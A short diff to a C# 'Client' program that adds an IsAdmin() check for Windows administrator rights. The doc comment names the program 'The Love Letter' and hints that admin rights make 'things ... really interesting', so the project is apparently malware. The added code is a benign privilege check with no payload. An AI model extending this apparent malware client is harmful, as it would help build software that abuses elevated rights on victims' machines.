@@ -4,6 +4,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Reflection;
+using System.Security.Principal;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -37,5 +38,15 @@ namespace Client
         public static int MyProcessID = Process.GetCurrentProcess().Id;
 
         public static float Version = 0.1f;
+
+        /// <summary>
+        /// Checks if The Love Letter is running as administrator because if it does...things will get really interesting.
+        /// </summary>
+        public static bool IsAdmin()
+        {
+            var identity = WindowsIdentity.GetCurrent();
+            var principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
     }
 }
